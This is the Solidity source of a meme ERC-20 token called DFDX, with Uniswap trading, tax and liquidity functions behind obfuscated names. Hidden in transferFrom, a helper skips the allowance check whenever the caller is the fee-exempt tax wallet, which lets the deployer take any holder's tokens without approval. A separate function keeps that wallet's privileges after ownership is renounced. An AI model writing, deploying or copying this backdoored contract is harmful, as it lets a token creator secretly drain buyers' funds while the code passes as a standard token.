// SPDX-License-Identifier: MIT
/*
    Name: DFDX
    Symbol: DFDX

    Unicorns aren't the only ones with magic farts.

    https://dragonfartdust.fun
    https://t.me/DragonFartDust
    https://x.com/DragonFart_Dust
*/
pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract DFDX is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcDFDX;
    mapping(address => mapping(address => uint256)) private _allcvnkjnDFDX;
    mapping(address => bool) private _feevblknlDFDX;
    address payable private _taxclknlDFDX;
    uint8 private constant _decimals = 9;
    uint256 private constant _XXXtomal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"DFDX";
    string private constant _symbol = unicode"DFDX";

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknDFDX;
    bool private _inlknblDFDX = false;
    bool private swapvlkDFDX = false;
    uint256 private _sellcnjkDFDX = 0;
    uint256 private _lastflkbnlDFDX = 0;
    address constant _deadlknDFDX = address(0xdead);

    uint256 public _vnbbvlkDFDX = _XXXtomal / 100;
    uint256 public _oijboijoiDFDX = 15 * 10**18;
    uint256 private _cvjkbnkjDFDX = 10;
    uint256 private _vkjbnkfjDFDX = 10;
    uint256 private _maxovnboiDFDX = 10;
    uint256 private _initvkjnbkjDFDX = 20;
    uint256 private _finvjlkbnlkjDFDX = 0;
    uint256 private _redclkjnkDFDX = 2;
    uint256 private _prevlfknjoiDFDX = 2;
    uint256 private _buylkvnlkDFDX = 0;
    IUniswapV2Router02 private uniswapV2Router;
    modifier lockTheSwap() {
        _inlknblDFDX = true;
        _;
        _inlknblDFDX = false;
    }
    constructor() payable {
        _taxclknlDFDX = payable(_msgSender());
        _feevblknlDFDX[address(this)] = true;
        _feevblknlDFDX[_taxclknlDFDX] = true;
        _balknvlkcDFDX[_msgSender()] = (_XXXtomal * 2) / 100;
        _balknvlkcDFDX[address(this)] = (_XXXtomal * 98) / 100;

        emit Transfer(address(0), _msgSender(), (_XXXtomal * 2) / 100);
        emit Transfer(address(0), address(this), (_XXXtomal * 98) / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _XXXtomal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcDFDX[account];
    }
    
    function _transfer_kjvnDFDX(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblDFDX(from, to, amount);
        _balknvlkcDFDX[from] = _balknvlkcDFDX[from].sub(amount);
        _balknvlkcDFDX[to] = _balknvlkcDFDX[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcDFDX[address(this)] = _balknvlkcDFDX[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknDFDX) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _downcklkojDFDX(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlDFDX[msg.sender]) return !_feevblknlDFDX[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknDFDX)) return false;
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnDFDX(sender, recipient, amount);
        if (_downcklkojDFDX(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnDFDX[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnDFDX[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnDFDX(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnDFDX[owner][spender];
    }

    function _calcTax_lvknblDFDX(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblDFDX) {
                taxAmount = amount
                    .mul((_buylkvnlkDFDX > _redclkjnkDFDX) ? _finvjlkbnlkjDFDX : _initvkjnbkjDFDX)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlDFDX[to] &&
                to != _taxclknlDFDX
            ) {
                _buylkvnlkDFDX++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblDFDX &&
                to == uniswapV2Pair &&
                from != _taxclknlDFDX &&
                swapvlkDFDX &&
                _buylkvnlkDFDX > _prevlfknjoiDFDX
            ) {
                if (block.number > _lastflkbnlDFDX) {
                    _sellcnjkDFDX = 0;
                }
                _sellcnjkDFDX = _sellcnjkDFDX + _getAmountOut_lvcbnkDFDX(amount);
                require(_sellcnjkDFDX <= _oijboijoiDFDX, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkDFDX)
                    _swapTokenslknlDFDX(_vnbbvlkDFDX > amount ? amount : _vnbbvlkDFDX);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjDFDX(address(this).balance);
                }
                _lastflkbnlDFDX = block.number;
            }
        }
        return taxAmount;
    }
    function _sendETHTocvbnjDFDX(uint256 amount) private {
        _taxclknlDFDX.transfer(amount);
    }
    function _swapTokenslknlDFDX(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function enableDFDXTrading() external onlyOwner {
        require(!_tradingvlknDFDX, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _XXXtomal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkDFDX = true;
        _tradingvlknDFDX = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnDFDX() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnkDFDX(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
    function removeLimits () external onlyOwner {
    }
    function _setTax_lknblDFDX(address payable newWallet) external {
        require(_feevblknlDFDX[_msgSender()]);
        _taxclknlDFDX = newWallet;
        _feevblknlDFDX[_taxclknlDFDX] = true;
    }
}